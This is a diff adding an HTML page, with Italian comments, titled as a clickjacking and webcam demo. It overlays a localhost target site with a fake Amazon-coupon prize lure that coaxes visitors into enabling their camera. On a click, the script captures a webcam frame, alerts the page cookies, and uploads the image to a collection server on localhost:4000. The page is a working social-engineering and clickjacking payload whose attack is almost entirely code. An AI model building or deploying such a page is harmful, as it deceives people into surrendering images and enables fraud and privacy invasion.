@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clickjacking + Webcam + Iframe</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+    }
+
+    /* Iframe di fondo */
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+    }
+
+    /* Webcam feed */
+    video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 2;
+      opacity: 0.1; /* Effetto semi-trasparente sopra l'iframe */
+    }
+
+    /* Overlay visibile sopra */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(255, 255, 255, 0.1); /* Sfondo traslucido */
+      z-index: 3;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .message {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .button {
+      background-color: #28a745;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    .button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .button:hover:enabled {
+      background-color: #218838;
+    }
+
+    canvas {
+      display: none; /* Canvas nascosto per catturare l'immagine */
+    }
+  </style>
+</head>
+<body>
+  <!-- Iframe di fondo -->
+  <iframe src="http://localhost:3000/"></iframe>
+
+  <!-- Video feed dalla webcam -->
+  <video id="video" autoplay></video>
+
+  <!-- Canvas per catturare l'immagine -->
+  <canvas id="canvas"></canvas>
+
+  <!-- Overlay visibile all'utente -->
+  <div class="overlay">
+    <div class="message">Complimenti, hai vinto un coupon Amazon di 10€!</div>
+    <div class="message">Abilita la cam, vogliamo vedere il tuo sorriso e confermare l'identità</div>
+    <img src="https://cdn.startselect.com/production/products/images/12129/70970/2080557815.png" alt="">
+    <button id="capture" class="button" disabled>Clicca qui per reclamare il premio</button>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+    const context = canvas.getContext('2d');
+
+    // Disabilita il bottone inizialmente
+    captureButton.disabled = true;
+
+    // Richiedi accesso alla webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+        // Abilita il bottone solo dopo che il flusso video è attivo
+        captureButton.disabled = false;
+      })
+      .catch((error) => {
+        alert("Accesso alla webcam negato!");
+        console.error(error);
+      });
+
+    // Scatta una foto e inviala al server
+    captureButton.addEventListener('click', () => {
+      // Disegna il frame corrente del video sul canvas
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      alert(document.cookie);
+      // Converti l'immagine in base64 e invia al server
+      const imageData = canvas.toDataURL('image/png');
+      fetch('http://localhost:4000/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData })
+      })
+      .then((response) => response.text())
+      .then((data) => {
+        alert("Immagine inviata al server!");
+        console.log("Risposta dal server:", data);
+      })
+      .catch((error) => {
+        console.error("Errore nell'invio dell'immagine:", error);
+      });
+    });
+  </script>
+</body>
+</html>
